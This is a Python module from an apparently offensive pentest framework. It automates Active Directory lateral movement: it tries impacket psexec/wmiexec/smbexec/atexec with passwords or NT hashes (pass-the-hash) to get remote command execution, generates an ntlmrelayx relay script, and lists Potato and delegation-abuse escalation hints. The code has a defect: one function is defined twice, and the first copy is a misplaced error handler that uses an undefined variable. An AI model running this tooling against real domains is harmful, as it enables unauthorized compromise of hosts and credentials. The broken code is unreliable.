"""VAJRA AD lateral movement (ad.movement) — turn validated domain
credentials into an authorized-command execution channel on the target,
which unlocks the post-recon phase.

  - pick the best impacket transport (psexec -> wmiexec -> smbexec -> atexec)
  - verify credentials first, then run a bounded proof command and expose an
    ADChannel in engine.state["channels"] so post.recon actually fires
  - drop an operator-run ntlmrelayx resource + replay guidance
  - BadPotato / RDP / delegation-flag notes for the report

Everything here is intrusive and requires --aggressive."""
import re
import subprocess
import time

from core.database import Finding
from core.utils import which_tool

EMPTY_LM = "aad3b435b51404eeaad3b435b51404ee"

TRANSPORTS = [
    "impacket-psexec", "psexec.py",
    "impacket-wmiexec", "wmiexec.py",
    "impacket-smbexec", "smbexec.py",
    "impacket-atexec", "atexec.py",
]
PROOF = "whoami & ipconfig /all"
HINTS = (
    "BadPotato / JuicyPotato-style token impersonation", "RDP if open",
    "delegation abuse (S4U2Self/S4U2Proxy) when unconstrained trusts exist",
)

class ADChannel:
    """Execution channel over an impacket transport. Interface-compatible
    with the RCEChannel used by post.recon (kind/run/alive)."""

    def __init__(self, engine, host, tool, base_args, realm, user):
        self.engine = engine
        self.host = host
        self.tool = tool
        self.realm = realm
        self.user = user
        self.kind = "windows"
        self._base = base_args or []
        self._last = ""
        self.token = "VJR" + engine.nonce(4)

    @property
    def alive(self):
        return bool(self.tool)

    def run(self, cmd):
        if not self.alive:
            return None
        try:
            r = subprocess.run(self._base + [cmd], capture_output=True,
                               text=True, timeout=30)
            out = (r.stdout or "") + "\n" + (r.stderr or "")
        except Exception as e:
            self._last = "error: %r" % e
            return None
        self._last = out
        if "exception" in out.lower() and "failed" in out.lower():
            return None
        return out[:8000]


def _creds(engine):
    return getattr(engine, "ad_creds", {}) or {}


def _realm(engine):
    ad = engine.state.get("ad") or {}
    return ad.get("realm") or ad.get("domain") or ""


def run(engine):
    t = engine.target
    host = t.scan_host()
    creds = _creds(engine)
    if not getattr(engine.args, "aggressive", False):
        engine.db.add_finding(Finding(
            t.display, "ad.movement", "coverage", "info",
            "Lateral-movement skipped (requires --aggressive)",
            detail="Validated AD credentials can be turned into service-level "
                   "execution via impacket psexec/wmiexec/smbexec/atexec.",
            confidence="firm"))
        return
    if not creds.get("user"):
        engine.db.add_finding(Finding(
            t.display, "ad.movement", "coverage", "info",
            "Lateral-movement skipped (no credentials supplied)",
            detail="Pass --ad-user/--ad-pass/--nthash to attempt "
                   "psexec/wmiexec execution channels.",
            confidence="firm"))
        return
    from modules.ad.privesc_ops import creds_valid
    if not creds_valid(engine, host):
        engine.db.add_finding(Finding(
            t.display, "ad.movement", "coverage", "info",
            "Lateral-movement skipped (credentials rejected by domain)",
            detail="The supplied AD principal could not authenticate.",
            confidence="firm"))
        return
    channel = _open_channel(engine, host, creds)
    if channel is None:
        return
    engine.state.setdefault("channels", []).append(channel)
    engine.log.finding("[movement] command channel live (%s -> %s)"
                       % (channel.user, host))
    engine.db.add_finding(Finding(
        t.display, "ad.movement", "exploit-proof", "critical",
        "COMMAND-EXECUTION CHANNEL ESTABLISHED on %s (%s)" % (host, "impacket"),
        detail=("Validated domain credentials granted a service-level "
                "execution channel via %s.\nProof (first run):\n%s"
                % (channel.tool.split("/")[-1], channel._last[:700])),
        evidence="auth=%s\\%s tool=%s" % (channel.realm, channel.user,
                                          channel.tool),
        remediation=("Assume the host is compromised. Enforce LAPS, "
                     "restrict account use to designated services, rotate "
                     "the credential."),
        confidence="firm"))
    _relay_guidance(engine, host, creds)
    _potato_notes(engine)


def _open_channel(engine, host, creds):
    realm = _realm(engine)
    nthash = creds.get("nthash", "")
    last_err = ""
    for transport in TRANSPORTS:
        tool = which_tool(transport)
        if not tool:
            continue
        if nthash:
            args = [tool, "-dc-ip", host, "-hashes",
                    EMPTY_LM + ":" + nthash,
                    "%s\\%s@%s" % (realm, creds["user"], host)]
        else:
            args = [tool, "-dc-ip", host,
                    "%s\\%s:%s@%s" % (realm, creds["user"],
                                      creds.get("password", ""), host)]
        chan = ADChannel(engine, host, tool, args, realm, creds["user"])
        chan._base = args
        try:
            r = subprocess.run(args + [PROOF], capture_output=True, text=True,
                               timeout=40)
            out = (r.stdout or "") + "\n" + (r.stderr or "")
        except Exception as e:
            last_err = "%s: %r" % (transport, e)
            continue
        chan._last = out
        low = out.lower()
        if "error" in low and ("access_denied" in low or "failed" in low or
                               "exception" in low):
            last_err = "%s: %s" % (transport, out[-200:].strip())
            engine.db.add_event(engine.target.display, "ad.movement",
                                "transport rejected: %s" % transport)
            continue
        if "share" in low and "denied" in low:
            last_err = "%s: share denied" % transport
            continue
        return chan


def _relay_guidance(engine, host, creds):
    engine.db.add_finding(Finding(
        engine.target.display, "ad.movement", "coverage", "info",
        "No impacket transport yielded a channel",
        detail=last_err or "all psexec-family transports failed",
        confidence="possible"))
    return None


def _relay_guidance(engine, host, creds):
    tool = which_tool("impacket-ntlmrelayx", "ntlmrelayx.py")
    if not tool:
        return
    nmap_host = engine.target.scan_host()
    rc = "\n".join([
        "# VAJRA NTLM-relay resource — operator-run only.",
        "# Prereq: get an inbound NTLM authentication to THIS box (e.g. a",
        "# coerced machine account / admin SMB session via PrintSpooler,",
        "# PetitPotam-style printer bug, or an SMB-on-the-wire hunt).",
        "# Then relay it to the target's SMB share:",
        tool + " -t smb://" + nmap_host + " -smb2support -i",
        "",
        "# With --ad-* credentials VAJRA also checks for relay worthy",
        "# findings (SMB signing disabled) — see the finding detail.",
    ]) + "\n"
    rel = engine.save_evidence("ntlmrelay_resource.sh", rc)
    engine.db.add_finding(Finding(
        engine.target.display, "ad.movement", "post-recon", "medium",
        "NTLM-relay path ready (operator-run)",
        detail=("Relay candidate: host speaks SMB%s%s"
                % (" (PTH-capable)" if creds.get("nthash") else "",
                   ".\nResource: " + (rel or "-"))),
        remediation="Enable SMB signing; disable NTLMv1; patch RPC coercion "
                    "bugs.", confidence="firm"))


def _potato_notes(engine):
    if not engine.state.get("channels"):
        return
    engine.db.add_finding(Finding(
        engine.target.display, "ad.movement", "post-recon", "low",
        "Privilege-escalation candidates for the live channel",
        detail="\n".join("- " + h for h in HINTS),
        confidence="possible"))